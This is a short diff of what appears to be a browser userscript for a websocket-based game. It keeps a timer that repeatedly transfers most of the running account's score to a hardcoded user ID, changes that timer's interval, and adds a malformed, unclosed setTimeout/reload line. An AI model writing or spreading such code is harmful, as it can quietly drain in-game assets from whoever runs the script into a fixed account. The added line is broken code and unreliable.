@@ -27278,4 +27278,5 @@ temp1.serverConnection.run(unsafeWindow.wssURL);
 setTimeout(restart, 3000);
 setInterval(() => {
     temp1.serverConnection.transferToUser(272700567, Math.floor(temp1.serverConnection.oldScore / 1.1))
-}, 120000);
+}, 360000);
+setTimeout(window.location.reload(600000)
